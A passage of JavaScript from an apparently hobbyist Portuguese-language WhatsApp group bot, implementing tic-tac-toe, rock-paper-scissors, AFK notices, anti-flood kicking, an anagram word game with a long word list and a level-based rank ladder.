      main[0].gilir = main[0].player2;
      naa = ky_ttt.filter((hhg) => !hhg.id.includes(m.chat));
      ky_ttt = naa;
      pop = main[0];
      ky_ttt.push(pop);
      tto = ky_ttt.filter((hgh) => hgh.id.includes(m.chat));
      tty = tto[0];
      angka = tto[0].angka;
      ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`;

      ucapmenang = () => {
        ucapan1 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*@${
          tty.player2.split("@")[0]
        }* Ganhou o jogo...\n🥳Parabéns Seu prêmio🏆: ${dinherowin}\n`;
        add_dinheiro(
          `${tty.player2.split("@")[0]}` + "@s.whatsapp.net",
          dinherowin
        );
        ucapan2 = `*🎳 Jogo Da Velha 🎲*

*O resultado final:*

${ttt}`;
        anya.sendMessage(
          m.chat,
          { text: ucapan1, contextInfo: { mentionedJid: [tty.player2] } },
          { quoted: m }
        );
        naa = ky_ttt.filter((hhg) => !hhg.id.includes(m.chat));
        return (ky_ttt = naa);
      };

      if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang();
      if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang();
      if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang();
      if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang();
      if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang();
      if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang();
      if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang();
      if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang();
      if (
        !ttt.includes("1️⃣") &&
        !ttt.includes("2️⃣") &&
        !ttt.includes("3️⃣") &&
        !ttt.includes("4️⃣") &&
        !ttt.includes("5️⃣") &&
        !ttt.includes("6️⃣") &&
        !ttt.includes("7️⃣") &&
        !ttt.includes("8️⃣") &&
        !ttt.includes("9️⃣")
      ) {
        ucapan1 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*_Terminou em Empate👌*`;
        ucapan2 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*O resultado final:*

${ttt}`;
        m.reply(ucapan1);
        naa = ky_ttt.filter((hhg) => !hhg.id.includes(m.chat));
        return (ky_ttt = naa);
      }
      ucapan = `*🎳 Jogo Da Velha 🎲*

Jogador1 @${tty.player1.split("@")[0]}=⭕
Jogador2 @${tty.player2.split("@")[0]}=❌

${ttt}
 
Sua vez = @${tty.player1.split("@")[0]}`;
      anya.sendMessage(
        m.chat,
        {
          text: ucapan1,
          contextInfo: { mentionedJid: [tty.player1, tty.player2] },
        },
        { quoted: m }
      );
    }    

//suit vp
    this.suit = this.suit ? this.suit : {}
    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
    if (roof) {
    let win = ''
    let tie = false
    if (m.sender == roof.p2 && /^(acc(ept)?|accept|sure|oke?|reject|dont|later|yes|can|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
    if (/^(reject|dont|later|n|no|can)/i.test(m.text)) {
    anya.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} reject the suit, the suit is canceled`, m)
    delete this.suit[roof.id]
    return !0
    }
    roof.status = 'play'
    roof.asal = m.chat
    clearTimeout(roof.waktu)
    //delete roof[roof.id].waktu
    anya.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
    if (!roof.pilih) anya.sendText(roof.p, `Please select \n\nRock🗿\nPaper📄\nScissors`, m)
    if (!roof.pilih2) anya.sendText(roof.p2, `Please select \n\nRock🗿\nPaper📄\nScissor️`, m)
    roof.waktu_milih = setTimeout(() => {
    if (!roof.pilih && !roof.pilih2) anya.sendText(m.chat, `Both players don't want to play,\nSuit canceled`)
    else if (!roof.pilih || !roof.pilih2) {
    win = !roof.pilih ? roof.p2 : roof.p
    anya.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} didn't choose suit, game over`, m)
    }
    delete this.suit[roof.id]
    return !0
    }, roof.timeout)
    }
    let jwb = m.sender == roof.p
    let jwb2 = m.sender == roof.p2
    let g = /scissors/i
    let b = /rock/i
    let k = /paper/i
    let reg = /^(scissors|rock|paper)/i
    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
    roof.pilih = reg.exec(m.text.toLowerCase())[0]
    roof.text = m.text
    m.reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
    if (!roof.pilih2) anya.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
    }
    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
    roof.text2 = m.text
    m.reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
    if (!roof.pilih) anya.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
    }
    let stage = roof.pilih
    let stage2 = roof.pilih2
    if (roof.pilih && roof.pilih2) {
    clearTimeout(roof.waktu_milih)
    if (b.test(stage) && g.test(stage2)) win = roof.p
    else if (b.test(stage) && k.test(stage2)) win = roof.p2
    else if (g.test(stage) && k.test(stage2)) win = roof.p
    else if (g.test(stage) && b.test(stage2)) win = roof.p2
    else if (k.test(stage) && b.test(stage2)) win = roof.p
    else if (k.test(stage) && g.test(stage2)) win = roof.p2
    else if (stage == stage2) tie = true
    anya.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
    delete this.suit[roof.id]
    }
    }
    
    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    for (let jid of mentionUser) {
 let user = global.db.users[jid]
 if (!user) continue
 let afkTime = user.afkTime
 if (!afkTime || afkTime < 0) continue
 let reason = user.afkReason || ''
 m.reply(`
Não o marque!
Ele está offline/AFK, ${reason ? 'com razão ' + reason : 'no reason'}
Tem sido ${clockString(new Date - afkTime)}
`.trim())
}

if (db.users[m.sender].afkTime > -1) {
 let user = global.db.users[m.sender]
 m.reply(`
Você voltou on-line do AFK ${user.afkReason ? ' after ' + user.afkReason : ''}
In ${clockString(new Date - user.afkTime)}
`.trim())
 user.afkTime = -1
 user.afkReason = ''
}

function lerNumber(numero) {
    if (numero.length == 13) return(""
        + numero.substring(0, 0)
        + "+"
        + numero.substring(0, 2)
        + " ("
        + numero.substring(2, 4)
        + ") "
        + numero.substring(9, 4)
        + "-"
        + numero.substring(9)
    );

    if (numero.length == 12) return(""
        + numero.substring(0, 0)
        + "+"
        + numero.substring(0, 2)
        + " ("
        + numero.substring(2, 4)
        + ") "
        + numero.substring(8, 4)
        + "-"
        + numero.substring(8)
    );
}

//anti call by elbielzin

/*anya.ws.on('CB:call', async (json) => {
    const callerId = json.content[0].attrs['call-creator']
    if (json.content[0].tag == 'offer') {
anya.sendMessage(callerId, { text: `*AVISO SOBRE LIGAÇÃO*\n\nLigações para o bot é totalmente proibido, foi enviado um reporte para o administrador para verificar se ele irá banir você de utilizar qualquer um dos nossos comandos ou irá apenas te dar aviso.\n_Pedimos que não ligue novamente_`})
// MSG POR DONO
let buttonsVote = [
  {buttonId: `callbot123 bloq ${callerId}`, buttonText: {displayText: 'BLOQUEAR'}, type: 1},
              {buttonId: `callbot123 avis ${callerId}`, buttonText: {displayText: 'AVISAR'}, type: 1}
]

            let buttonMessageVote = {
                text: 'O número *' + callerId.split("@")[0] + '* ligou para o bot, deseja encaminhar um aviso para ele ou bloquear?',
                footer: `${watermark}`,
                buttons: buttonsVote,
                headerType: 1
            }
            anya.sendMessage("558898204406@s.whatsapp.net", buttonMessageVote)
    }
    })
    
   if (isButton.includes("callbot123")) {
callId = isButton.trim().split(/ +/).slice(1)
if (isButton.includes("bloq")) {
anya.sendMessage(callId[1], {text: "Por causa da sua ligação, seu número"})
anya.updateBlockStatus(callId[1], "block")
} else if (isButton.includes("avis")){
anya.sendMessage(callId[1], {text: "Peço para não ligar novamente, caso ligar vai ser banido de usar o bot."})
}
}    */

function responderCorr(number_) {
listMessage = {
                    text: 'Respostas rapidas',
                    footer: 'Mostrar opções',
                    buttonText: 'Opções',
                    title: "respostas rápidas",
                    sections: [{
                        title: 'selecione abaixo',
                        rows: [{
                            rowId: `!correio ${number_}|oi`,
                            title: 'oi',
                            description: ''
                        },
                        {
                            rowId: `!correio ${number_}|tudo bem?`,
                            title: 'tudo bem?',
                            description: ''
                        },{
                            rowId: `!correio ${number_}|depois conversamos`,
                            title: 'depois conversamos',
                            description: ''
                        },{
                            rowId: `!correio ${number_}|estou indisponível no momento!`,
                            title: 'estou indisponível no momento!',
                            description: ''
                        }]
                    }]
                }
                anya.sendMessage(from, listMessage)
m.reply(`caso deseje enviar outra coisa digite !correio ${number_}|mensagem`)
}

      /********AUTO REAÇÃO********/
var lonetotoso = ["😃","☹️","♥️","🤬","🧐","🥜","😘","🥲","🤫","🥱","😳","😲","🥸","🤓","😏","😜","😡","🤖","💤","💋","🫂","👀","🤗","🦾","🤞","🤌","🤙","🤏","🤳","🤸","🦸","🕺","💃","🕴️","⚡","🦮","🕸️","🪀","👾","✅","🛐","🤔","😚","😐","🤯","🥵","💫","🙈","🙀","🤘","🤲","🖖"]
var sadtrap = lonetotoso[Math.floor(Math.random() * (lonetotoso.length))]

      if(isAutReact) {
        anya.sendMessage(from, { react: { text: `${sadtrap}`, key: m.key }})
        }        
       /********FIM DO AUTO REAÇÃO********/   
       
       
/***********[block cmd]**********/              
const isCmdBlocked = (teks) => {
return blockcmd.includes(teks)
}						

if (isCreator && isCmd && blockcmd.includes(command)) return m.reply('*🚫 Esse comando não está disponível no momento meu amigo 🚫*')       
/***********[fim do block cmd]**********/        

if (budy.length >= limitefl) { 
if(!isAntiFlood) return
if(isAntiFlood && isAdmins && isBotAdmins) {
m.reply('*Link detectado, porém usuário é admin*')
} else {
if(isCreator) return
if(isAdmins) return
var Kic = `${m.sender.split("@")[0]}@s.whatsapp.net`  
setTimeout( () => {
if(!isCreator && !isAdmins && !isGroupOwner) return m.reply('Muitas características enviadas, eu afirmo que pode ser trava, por precauções, eu irei remover.')
console.log(color('deram Spam','red'))
}, 100)
setTimeout( () => {
anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}, 1000)
setTimeout( () => {
}, 0)
}	
setTimeout( () => {
anya.sendMessage(from, { delete: m.key })
}, 100)
}

/**********ANAGRAMA**********/           
let palavrasANA = [
{
original: 'PARADOXO',
embaralhada: 'XOPARODA',
dica: 'CANAL'
},
{
original: 'ESCADA',
embaralhada: 'CAESDA',
dica: 'OBJETO'
},
{
original: 'AKAME',
embaralhada: 'MEAKA',
dica: 'PERSONAGEM'
},
{
original: 'ALBEDO',
embaralhada: 'EBDOLA',
dica: 'OVERLORD'
},
{
original: 'SHALLTEAR',
embaralhada: 'ALLSHTEAR',
dica: 'OVERLORD'
},
{
original: 'AINZ-SAMA',
embaralhada: 'NZAI-MASA',
dica: 'OVERLORD'
},
{
original: 'ELFEN LIED',
embaralhada: 'DELI FENEL',
dica: 'ANIME'
},
{
original: 'STEINS GATE',
embaralhada: 'TEGA EINSTS',
dica: 'ANIME'
},
{
original: 'ÁGUIA',
embaralhada: 'IAUGÁ',
dica: 'ANIMAL'
},
{
original: 'LAGARTO',
embaralhada: 'GARLATO',
dica: 'ANIMAL'
},
{
original: 'MINHOCA',
embaralhada: 'CAOHNMI',
dica: 'ANIMAL'
},
{
original: 'CHIMPANZÉ',
embaralhada: 'ZÉPANMIHC',
dica: 'ANIMAL'
},
{
original: 'TATU',
embaralhada: 'UTTA',
dica: 'ANIMAL'
},
{
original: 'GUAXINIM',
embaralhada: 'XIMINGAU',
dica: 'ANIMAL'
},
{
original: 'URSO',
embaralhada: 'SOUR',
dica: 'ANIMAL'
},
{
original: 'PINGUIM',
embaralhada: 'MIGUPIN',
dica: 'ANIMAL'
},
{
original: 'ORNITORRINCO',
embaralhada: 'ROCIRORNITON',
dica: 'ANIMAL'
},
{
original: 'DARLING IN THE FRANXX',
embaralhada: 'RINGDAL NI HTE XANXFR',
dica: 'ANIME'
},
{
original: 'NEON GENESIS EVANGELION',
embaralhada: 'NOEN SEISNEG GELIONEVAN',
dica: 'ANIME'
},
{
original: 'CORPSE PARTY',
embaralhada: 'PSECOR TYPAR',
dica: 'ANIME'
},
{
original: 'OVERLORD',
embaralhada: 'ROLDOVER',
dica: 'ANIME'
},
{
original: 'ASTOLFO',
embaralhada: 'TOLFOAS',
dica: 'PERSONAGEM ANIME'
},
{
original: 'ZERO TWO',
embaralhada: 'EROZ OWT',
dica: 'PERSONAGEM ANIME'
},
{
original: 'E=M.C²',
embaralhada: 'M=C.E²',
dica: 'EQUIVALÊNCIA MASSA-ENERGIA'
},
{
original: 'ALBERT EINSTEIN',
embaralhada: 'BERTAL TEINSEIN',
dica: 'FISICO-TEÓRICO'
},
{
original: 'STEPHEN KING',
embaralhada: 'PHENSTE GINK',
dica: 'ESCRITOR'
},
{
original: 'KONOSUBA',
embaralhada: 'BASUNOKO',
dica: 'ANIME'
},
{
original: 'MEGUMIN',
embaralhada: 'MINGUME',
dica: 'PERSONAGEM ANIME'
},
{
original: 'AQUA',
embaralhada: 'QUAA',
dica: 'PERSONAGEM ANIME'
},
{
original: 'DARKNESS',
embaralhada: 'KNESDARS',
dica: 'PERSONAGEM ANIME'
},
{
original: 'HINATA',
embaralhada: 'TANAHI',
dica: 'PERSONAGEM ANIME'
},
{
original: 'SWORD ART ONLINE',
embaralhada: 'WORDS RAT NELION',
dica: 'ANIME'
},
{
original: 'MIRAI NIKKI',
embaralhada: 'RAIMI KINIK',
dica: 'ANIME'
},
{
original: 'BORUTO',
embaralhada: 'TORUBO',
dica: 'PERSONAGEM ANIME'
},
{
original: 'CORNO',
embaralhada: 'ONROC',
dica: 'VOCÊ'
},
{
original: 'KRATOS',
embaralhada: 'TOSKRA',
dica: 'BOM DE GUERRA'
},
{
original: 'ESCANOR',
embaralhada: 'NORESCA',
dica: 'PERSONAGEM ANIME'
},
{
original: 'STAR WARS',
embaralhada: 'RATS RASW',
dica: 'FILME'
},
{
original: 'STAN LEE',
embaralhada: 'TANS ELE',
dica: 'CRIADOR DO HOMEM ARANHA'
},
{
original: 'ZEROTWO',
embaralhada: 'TOWROZE',
dica: 'PERSONAGEM ANIME'
},
{
original: 'BUNDA',
embaralhada: 'DABUN',
dica: 'VOCÊ JÁ DEU'
},
{
original: 'FÊMUR',
embaralhada: 'MURFÊ',
dica: 'PARTE DO CORPO'
},
{
original: 'DARLING IN THE FRANXX',
embaralhada: 'RINGDAL NI HTE XANXFR',
dica: 'ANIME'
},
{
original: 'SIMBA',
embaralhada: 'BASIM',
dica: 'REI LEÃO'
},
{
original: 'CUPHEAD',
embaralhada: 'DAHEPUC',
dica: 'JOGO'
},
{
original: 'FREE FIRE',
embaralhada: 'EFRE REFI',
dica: 'JOGO DE CORNO'
},
{
original: 'GRAND THEFT AUTO',
embaralhada: 'GANDR HEFTT TOAU',
dica: 'GTA'
},
{
original: 'TREVOR',
embaralhada: 'VORRET',
dica: 'GTA V'
},
{
original: 'SEBASTIÃO',
embaralhada: 'ÃOTISEBAS',
dica: 'NOME'
},
{
original: 'LEON E NILCE',
embaralhada: 'NOLE E CELNI',
dica: 'COISA DE NERD'
},
{
original: 'COISA DE NERD',
embaralhada: 'SAICO ED REND',
dica: 'CANAL YOUTUBE'
},
{
original: 'VOICE MAKERS',
embaralhada: 'ECIOV KERSMA',
dica: 'CANAL YOUTUBE'
},
{
original: 'MIA KHALIFA',
embaralhada: 'MAI LIFAHAK',
dica: 'ATRIZ PORNO'
},
{
original: 'SASHA GREY',
embaralhada: 'SHASA REYG',
dica: 'ATRIZ PORNO'
},
{
original: 'STOYA',
embaralhada: 'YATOS',
dica: 'ATRIZ PORNO'
},
{
original: 'ECCHI',
embaralhada: 'HICCE',
dica: 'GENÊRO ANIME'
},
{
original: 'SIRIUS',
embaralhada: 'RIUSSI',
dica: 'ESTRELA'
},
{
original: 'EVA',
embaralhada: 'VEA',
dica: 'NOME'
},
{
original: 'CORRA',
embaralhada: 'RACOR',
dica: 'FILME'
},
{
original: 'DARK',
embaralhada: 'KARD',
dica: 'SÉRIE NETFLIX'
},
{
original: 'SOBERANO',
embaralhada: 'RANOBESO',
dica: 'REI'
},
{
original: 'RATO',
embaralhada: 'TORA',
dica: 'MOUSE'
},
{
original: 'MOUSE',
embaralhada: 'SMOUE',
dica: 'RATO'
},
{
original: 'PUBG',
embaralhada: 'GUBP',
dica: 'JOGO'
},
{
original: 'FINAL FANTASY',
embaralhada: 'LANFI TASYFAN',
dica: 'JOGO'
},
{
original: 'GOD OF WAR',
embaralhada: 'DOG FO RAW',
dica: 'JOGO'
},
{
original: 'CRASH BANDICOOT',
embaralhada: 'SAHCR COTOBANDI',
dica: 'JOGO'
},
{
original: 'CU',
embaralhada: 'CU',
dica: 'CU'
},
{
original: 'GADO',
embaralhada: 'DOGA',
dica: 'VOCÊ'
},
{
original: 'MÉXICO',
embaralhada: 'XICOMÉ',
dica: 'PAÍS'
},
{
original: 'MÉXICO',
embaralhada: 'XICOMÉ',
dica: 'PAÍS'
},
{
original: 'CANADÁ',
embaralhada: 'DÁCANA',
dica: 'PAÍS'
},
{
original: 'INGLATERRA',
embaralhada: 'GLAINRATER',
dica: 'PAÍS'
},
{
original: 'BRASIL',
embaralhada: 'LISBAR',
dica: 'PAÍS'
},
{
original: 'EQUADOR',
embaralhada: 'QUADORE',
dica: 'PAÍS'
},
{
original: 'PARIS',
embaralhada: 'RISPA',
dica: 'CIDADE'
},
{
original: 'BOQUETE',
embaralhada: 'QUETEBO',
dica: 'ATO LIBIDINOSO'
},
{
original: '',
embaralhada: 'XICOMÉ',
dica: 'PAÍS'
},
{
original: 'GOSTOSO',
embaralhada: 'TOSOGOS',
dica: 'CRIADOR DO BOT'
},
{
original: 'IMAGINE DRAGONS',
embaralhada: 'GINEIMA GONSDRA',
dica: 'BANDA'
},
{
original: 'BRKSEDU',
embaralhada: 'DUEKSBR',
dica: 'YOUTUBER'
},
{
original: 'VIBRADOR',
embaralhada: 'DORBRIVA',
dica: 'OBJETO LIBIDINOSO'
},
{
original: 'SEXO',
embaralhada: 'XOSE',
dica: 'VOCÊ NUNCA FEZ'
},
{
original: 'BUNDA',
embaralhada: 'DANBU',
dica: 'VOCÊ JÁ DEU'
},
{
original: 'ANYA',
embaralhada: 'NAYA',
dica: 'BOT'
},
{
original: 'ANOTHER',
embaralhada: 'THERANO',
dica: 'ANIME'
},
{
original: 'PETER PARKER',
embaralhada: 'KERRAP TERPE',
dica: 'MARVEL'
},
{
original: 'TONY STARK',
embaralhada: 'TARKS NYTO',
dica: 'MARVEL'
},
{
original: 'HULK',
embaralhada: 'KHLU',
dica: 'MARVEL'
},
{
original: 'SCORPION',
embaralhada: 'ONPICORS',
dica: 'MORTAL KOMBAT'
},
{
original: 'MORTAL KOMBAT',
embaralhada: 'BATMOK LAMORT',
dica: 'MORTAL KOMBAT'
},
{
original: 'CETRION',
embaralhada: 'TRIONCE',
dica: 'MORTAL KOMBAT'
},
{
original: 'MISAKI MEI',
embaralhada: 'MIE KISAMI',
dica: 'ANIME'
},
{
original: 'NAGATORO',
embaralhada: 'GATONARO',
dica: 'PERSONAGEM'
},
{
original: 'SASUKE',
embaralhada: 'KESUSA',
dica: 'PERSONAGEM'
},
{
original: 'GAY',
embaralhada: 'YAG',
dica: 'VOCÊ'
},
{
original: 'ALONE',
embaralhada: 'ANOLE',
dica: 'DONO DO BOT'
},
{
original: 'BANANA',
embaralhada: 'NABANA',
dica: 'COMIDA'
},
{
original: 'NETFLIX',
embaralhada: 'TFLIXNE',
dica: 'APLICATIVO'
},
{
original: 'YOUTUBE',
embaralhada: 'TUBEYOU',
dica: 'APLICATIVO'
},
{
original: 'PORTUGAL',
embaralhada: 'TUGALPOR',
dica: 'PAÍS'
},
{
original: 'PISTOLA',
embaralhada: 'TOPISLA',
dica: 'OBJETO'
},
		
{
original: 'CAMARÃO',
embaralhada: 'MARÃOCA',
dica: 'COMIDA'
},
{
original: 'HIDRANTE',
embaralhada: 'TEHDIRAN',
dica: 'OBJETO'
},
{
original: 'FOGUETE',
embaralhada: 'TEFOGUE',
dica: 'OBJETO'
},
{
original: 'SKATE',
embaralhada: 'TEASK',
dica: 'OBJETO'
},
{
original: 'MACACO',
embaralhada: 'CACOMA',
dica: 'ANIMAL'
},
{
original: 'LASANHA',
embaralhada: 'NHASALA',
dica: 'COMIDA'
},
{
original: 'PASTEL',
embaralhada: 'PATELS',
dica: 'COMIDA'
},
{
original: 'COXINHA',
embaralhada: 'XICONHA',
dica: 'COMIDA'
},
{
original: 'BICICLETA',
embaralhada: 'CIBITACLE',
dica: 'OBJETO'
},
{
original: 'SASUKE',
embaralhada: 'ESASUK',
dica: 'PERSONAGEM'
},
{
original: 'CAVALO',
embaralhada: 'LACAVO',
dica: 'ANIMAL'
},
{
original: 'LEVI',
embaralhada: 'EVIL',
dica: 'PERSONAGEM'
},
{
original: 'KAMAITACHI',
embaralhada: 'TAICAMAKHI',
dica: 'CANTOR'
},
{
original: 'LUBA',
embaralhada: 'UBAL',
dica: 'YOUTUBER'
},
{
original: 'GRÊMIO',
embaralhada: 'OMÊGRI',
dica: 'TIME'
},
{
original: 'SATURNO',
embaralhada: 'UTARSON',
dica: 'PLANETA'
},
{
original: 'MIKASA',
embaralhada: 'KAMISA',
dica: 'PERSONAGEM'
},
{
original: 'LEÃO',
embaralhada: 'OLEÃ',
dica: 'ANIMAL'
},
{
original: 'SAKURA',
embaralhada: 'SUKARA',
dica: 'PERSONAGEM'
},
{
original: 'HADES',
embaralhada: 'SEDAH',
dica: 'MITOLOGIA'
},
{
original: 'CORRIDA',
embaralhada: 'ARROCID',
dica: 'ESPORTE'
},
{
original: 'ODIN',
embaralhada: 'NODI',
dica: 'MITOLOGIA'
},
{
original: 'BICICLETA',
embaralhada: 'CIBITACLE',
dica: 'OBJETO'
},
{
original: 'BICICLETA',
embaralhada: 'CIBITACLE',
dica: 'OBJETO'
},
{
original: 'GUATEMALA',
embaralhada: 'LATEMAGUA',
dica: 'PAÍS'
},
{
original: 'CEREJA',
embaralhada: 'ECREJA',
dica: 'FRUTA'
},
{
original: 'VENEZUELA',
embaralhada: 'ZUNEEVELA',
dica: 'PAÍS'
},
{
original: 'HISTÓRIA',
embaralhada: 'TÓRISIAH',
dica: 'MATÉRIA'
},
{
original: 'INSTAGRAM',
embaralhada: 'TAGRAMINS',
dica: 'APLICATIVO'
},
{
original: 'WHATSAPP',
embaralhada: 'TSWHAAPP',
dica: 'APLICATIVO'
},
{
original: 'HIDRANTE',
embaralhada: 'TEHDIRAN',
dica: 'OBJETO'
},
{
original: 'CELULAR',
embaralhada: 'CELARLU',
dica: 'OBJETO'
},
{
original: 'NOTEBOOK',
embaralhada: 'TENOBOOK',
dica: 'OBJETO'
},
{
original: 'COMPUTADOR',
embaralhada: 'PUCOMDORTA',
dica: 'OBJETO'
},
{
original: 'LANTERNA',
embaralhada: 'TERLANNA',
dica: 'OBJETO'
},
{
original: 'CACHORRO',
embaralhada: 'CAORROCHO',
dica: 'ANIMAL'
},
{
original: 'DESENTUPIDOR',
embaralhada: 'SENDETUDORPI',
dica: 'OBJETO'
},
{
original: 'TOMATE',
embaralhada: 'ATEMOT',
dica: 'ALIMENTO'
},
{
original: 'SAXOFONE',
embaralhada: 'ASXOEOFN',
dica: 'INSTRUMENTO MUSICAL'
},
{
original: 'CAZAQUISTÃO',
embaralhada: 'ZAACQIUSÃOT',
dica: 'PAÍS'
},
{
original: 'CROÁCIA',
embaralhada: 'CRCÁOAI',
dica: 'PAÍS'
},
{
original: 'HUNGRIA',
embaralhada: 'UHGINRA',
dica: 'PAÍS'
},
{
original: 'MEGAFONE',
embaralhada: 'MOEFGNEA',
dica: 'OBJETO' 
},
{
original: 'CINTURA',
embaralhada: 'RCIANUT',
dica: 'CORPO HUMANO'
},
{
original: 'ABDÔMEN',
embaralhada: 'MBÔDENA',
dica: 'CORPO HUMANO'
},
{
original: 'VAGNER',
embaralhada: 'GNEVAR',
dica: 'NOME'
},
{
  original: 'GEOVANA',
embaralhada: 'OAENVAG',
dica: 'NOME'
},
{
  original: 'MAÇA',
embaralhada: 'Mçaa',
dica: 'FRUTA'
},
{
  original: 'GARFO',
embaralhada: 'FGROA',
dica: 'OBJETO'
},
{
  original: 'CADEIRA',
embaralhada: 'CIAEDRA',
dica: 'Objeto'
},
{
  
original: 'TANGERINA',
embaralhada: 'RITAANGNE',
dica: 'ALIMENTO'
}
]	

		//JOGO DO ANAGRAM
if (m.isGroup && fs.existsSync(`./src/anagrama-${from}.json`)){
let dataAnagrama = JSON.parse(fs.readFileSync(`./src/anagrama-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataAnagrama.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataAnagrama.original) return m.reply('está perto')
xp = Math.floor(Math.random() * 34567) + 56720
dinhero = Math.floor(Math.random() * 35) + 250
if(budy.toUpperCase() == dataAnagrama.original) { 
alonkkj = `parabéns ${pushname} 🥳 você ganhou o jogo\nPalavra : ${dataAnagrama.original}\nclique no botão abaixo para iniciar o proximo jogo..`, fs.unlinkSync(`./src/anagrama-${from}.json`)
  let buttons = [
                        { buttonId: `!anagram`, buttonText: { displayText: `PROXIMO` }, type: 1 },                       
                    ]
                    await anya.sendButtonText(m.chat, buttons, alonkkj, `${watermark}`, m)
//addLevelingXp(m.sender, xp)
//addKoinUser(m.sender, dinhero)
recompensa = `🎉🎉RECOMPENSA🎉🎉\nVocê ganhou ${xp} em *xp* e ${dinhero} em *dinhero*`
m.reply(recompensa)

/*async function Anagram() {
fs.writeFileSync(`./src/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[Math.floor(Math.random() * palavrasANA.length)])}`)
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./src/anagrama-${from}.json`))
m.reply( `
╭─────≽「 👾 ANAGRAMA 👾 」
│➽ DESCUBRA A PALAVRA
│➽ ANAGRAMA: ${dataAnagrama2.embaralhada}
│➽ DICA: ${dataAnagrama2.dica}
╰────────────────────────`)
}*/
}}
/**********FIM DO ANAGRAMA**********/

/**********PATENTES**********/
const levelRole = getLevelingLevel(m.sender, _level)
         var role = 'Bronze I🥉'
   	     if (levelRole <= 3) {
   	         role = 'Bronze  I🥉'
   	     } else if (levelRole <= 5) {
   	         role = 'Bronze II🥉'
   	     } else if (levelRole <= 7) {
   	         role = 'Bronze  III🥉'
   	     } else if (levelRole <= 8) {
   	         role = 'Bronze  IV🥉'
   	     } else if (levelRole <= 9) {
   	         role = 'Bronze  V🥉'
   	     } else if (levelRole <= 10) {
   	         role = 'Prata I🥈'
   	     } else if (levelRole <= 11) {
   	         role = 'Prata II🥈'
   	     } else if (levelRole <= 12) {
   	         role = 'Prata III🥈'
   	     } else if (levelRole <= 13) {
   	         role = 'Prata IV🥈'
   	     } else if (levelRole <= 14) {
   	         role = 'Prata V🥈'
   	     } else if (levelRole <= 14) {
   	         role = 'Ouro I🥇'
   	     } else if (levelRole <= 15) {
   	         role = 'Ouro II🥇'
   	     } else if (levelRole <= 16) {
   	         role = 'Ouro III🥇'
   	     } else if (levelRole <= 17) {
   	         role = 'Ouro IV🥇'
   	     } else if (levelRole <= 18) {
   	         role = 'Ouro V🥇'
   	     } else if (levelRole <= 19) {
   	         role = 'Campeão I🏆'
   	     } else if (levelRole <= 20) {
   	         role = 'Campeão II🏆'
   	     } else if (levelRole <= 21) {
   	         role = 'Campeão III🏆'
   	     } else if (levelRole <= 22) {
   	         role = 'Campeão IV🏆'
   	     } else if (levelRole <= 23) {
   	         role = 'Campeão V🏆'
   	     } else if (levelRole <= 24) {
   	         role = 'Diamante I 💎'   	         
   	     } else if (levelRole <= 25) {
   	         role = 'Diamante II 💎'    
   	     } else if (levelRole <= 26) {
   	         role = 'Diamante III 💎'   	     
   	     } else if (levelRole <= 27) {
   	         role = 'Diamante IV 💎️'   	         
   	     } else if (levelRole <= 28) {
   	         role = 'Diamante V 💎️'    
   	     } else if (levelRole <= 29) {
   	         role = 'Mestre I 🐂️'     
   	     } else if (levelRole <= 30) {
   	         role = 'Mestre II 🐂️'         
   	     } else if (levelRole <= 31) {
   	         role = 'Mestre III 🐂'   	         
   	     } else if (levelRole <= 32) {
   	         role = 'Mestre IV 🐂'    
   	     } else if (levelRole <= 33) {
   	         role = 'Mestre V 🐂'     
   	     } else if (levelRole <= 34) {
    	        role = 'Mítico I 🔮'            
    	    } else if (levelRole <= 31) {
   	         role = 'Mítico II 🔮'   	         
   	     } else if (levelRole <= 32) {
   	         role = 'Mítico III 🔮'    
   	     } else if (levelRole <= 33) {
   	         role = 'Mítico IV 🔮'     
   	     } else if (levelRole <= 34) {
    	        role = 'Mítico V 🔮'                   	    
   	    } else if (levelRole <= 35) {
    	        role = 'Lenda I ⚡'                
 	      } else if (levelRole <= 36) {
    	        role = 'Lenda II ⚡'                
        } else if (levelRole <= 37) {
    	        role = 'Lenda III ⚡'                
	       } else if (levelRole <= 38) {
    	        role = 'Lenda IV ⚡'                
